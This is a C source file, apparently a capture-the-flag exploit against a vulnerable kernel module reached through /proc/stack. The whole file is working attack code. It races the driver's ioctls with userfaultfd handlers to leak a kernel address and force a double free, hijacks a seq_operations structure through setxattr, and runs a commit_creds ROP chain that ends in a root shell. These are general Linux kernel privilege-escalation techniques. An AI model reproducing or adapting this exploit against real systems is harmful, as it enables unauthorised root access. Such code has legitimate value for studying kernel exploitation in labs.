#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <poll.h>
#include <string.h>
#include <assert.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/userfaultfd.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/sem.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <semaphore.h>

#define PAGE_SIZE 0x1000

int fd;
size_t seq_fd;
size_t seq_fds[0x100];
size_t kernel_offset;

void ErrExit(char* err_msg)
{
	puts(err_msg);
	exit(-1);
}

void push(char* data)
{
	if(ioctl(fd, 0x57AC0001, data) < 0)
		ErrExit("push error");
}

void pop(char* data)
{
	if(ioctl(fd, 0x57AC0002, data) < 0)
		ErrExit("pop error");
}

void get_shell()
{
	if (getuid() == 0)
	{
		system("/bin/sh");
	}
	else
	{
		puts("[-] get shell error");
		exit(1);
	}
}

void register_userfault(void *fault_page,void *handler)
{
	pthread_t thr;
	struct uffdio_api ua;
	struct uffdio_register ur;
	uint64_t uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
	ua.api = UFFD_API;
	ua.features = 0;
	if(ioctl(uffd, UFFDIO_API, &ua) == -1)
		ErrExit("[-] ioctl-UFFDIO_API error");
	
	ur.range.start = (unsigned long)fault_page; // the area we want to monitor
	ur.range.len = PAGE_SIZE;
	ur.mode = UFFDIO_REGISTER_MODE_MISSING;
	if(ioctl(uffd, UFFDIO_REGISTER, &ur) == -1) // register missing page error handling. when a missing page occurs, the program will block. at this time, we will operate in another thread
		ErrExit("[-] ioctl-UFFDIO_REGISTER error");
	// open a thread, receive the wrong signal, and the handle it
	int s = pthread_create(&thr, NULL, handler, (void*)uffd);
	if(s!=0)
		ErrExit("[-] pthread-create error");
}

void *userfault_leak_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;
	
	puts("[+] leak handler created");
	pop(&kernel_offset);
	kernel_offset-= 0xffffffff81c37bc0;
	printf("[+] kernel offset: 0x%lx\n", kernel_offset);
	
	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] leak handler done");
}

void *userfault_double_free_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");

	struct uffdio_copy uc;
	
	// init page
	memset(page, 0, sizeof(page));
	
	puts("[+] double free handler created");
	pop(page);

	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] double free handler done");
}

size_t pop_rdi_ret = 0xffffffff81034505;
size_t mov_rdi_rax_pop_rbp_ret = 0xffffffff8121f89a;
size_t prepare_kernel_cred = 0xffffffff81069e00;
size_t commit_creds = 0xffffffff81069c10;
size_t swapgs_restore_regs_and_return_to_usermode = 0xffffffff81600a34;

void *userfault_hijack_handler(void *arg)
{
	struct uffd_msg msg;
	unsigned long uffd = (unsigned long)arg;
	
	struct pollfd pollfd;
	int nready;
	pollfd.fd = uffd;
	pollfd.events = POLLIN;
	nready = poll(&pollfd, 1, -1);
	
	if(nready != 1)
		ErrExit("[-] wrong poll return value");
	nready = read(uffd, &msg, sizeof(msg));
	if(nready<=0)
		ErrExit("[-] msg error");
	
	char *page = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(page == MAP_FAILED)
		ErrExit("[-] mmap error");
	struct uffdio_copy uc;

	puts("[+] hijack handler created");
	puts("[+] tigger..");
	for(int i=0; i<100; i++)
		close(seq_fds[i]);
	
	pop_rdi_ret += kernel_offset;
	mov_rdi_rax_pop_rbp_ret += kernel_offset;
	prepare_kernel_cred += kernel_offset;
	commit_creds += kernel_offset;
	swapgs_restore_regs_and_return_to_usermode += kernel_offset + 0x10;

	__asm__(
	"mov r15,   0xbeefdead;"
	"mov r14,   0x11111111;"
	"mov r13,   pop_rdi_ret;"
	"mov r12,   0;"
	"mov rbp,   prepare_kernel_cred;"
	"mov rbx,   mov_rdi_rax_pop_rbp_ret;"    
	"mov r11,   0x66666666;"
	"mov r10,   commit_creds;"
	"mov r9,    swapgs_restore_regs_and_return_to_usermode;"
	"mov r8,    0x99999999;"
	"xor rax,   rax;"
	"mov rcx,   0xaaaaaaaa;"
	"mov rdx,   8;"
	"mov rsi,   rsp;"
	"mov rdi,   seq_fd;"
	"syscall"
	);
	
	printf("[+] uid: %d gid: %d\n", getuid(), getgid());
	get_shell();
        
	// init page
	memset(page, 0, sizeof(page));
	uc.src = (unsigned long)page;
	uc.dst = (unsigned long)msg.arg.pagefault.address & ~(PAGE_SIZE - 1);
	uc.len = PAGE_SIZE;
	uc.mode = 0;
	uc.copy = 0;
	ioctl(uffd, UFFDIO_COPY, &uc);
	puts("[+] hijack handler done");
}

int main()
{
	size_t size[0x10];
	char* leak_buf;
	char* double_free_buf;
	char* hijack_buf;
	int shm_id;
	char* shm_addr;
	
	fd = open("/proc/stack",O_RDONLY);
	if(fd < 0)
		ErrExit("[-] open kstack error");
	
	for(int i=0; i<100; i++)
		if ((seq_fds[i] = open("/proc/self/stat", O_RDONLY)) < 0)
			ErrExit("open stat error");

	leak_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(leak_buf, userfault_leak_handler);

	shm_id = shmget(114514, 0x1000, SHM_R | SHM_W | IPC_CREAT);
	if (shm_id < 0)
		ErrExit("shmget error");
	shm_addr = shmat(shm_id, NULL, 0);
	if (shm_addr < 0)
		ErrExit("shmat!");
	if(shmdt(shm_addr) < 0)
		ErrExit("shmdt error");

	push(leak_buf);
	
	double_free_buf = (char*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(double_free_buf, userfault_double_free_handler);
	
	push("fxc");
	pop(double_free_buf);
	
	hijack_buf = (char*)mmap(NULL, 2*PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	register_userfault(hijack_buf+PAGE_SIZE, userfault_hijack_handler);
	*(size_t*)(hijack_buf + PAGE_SIZE - 8) = 0xffffffff814d51c0 + kernel_offset;

	if ((seq_fd = open("/proc/self/stat", O_RDONLY)) < 0)
		ErrExit("open stat error");

	setxattr("/exp", "fxc", hijack_buf + PAGE_SIZE - 8, 32, 0);
}
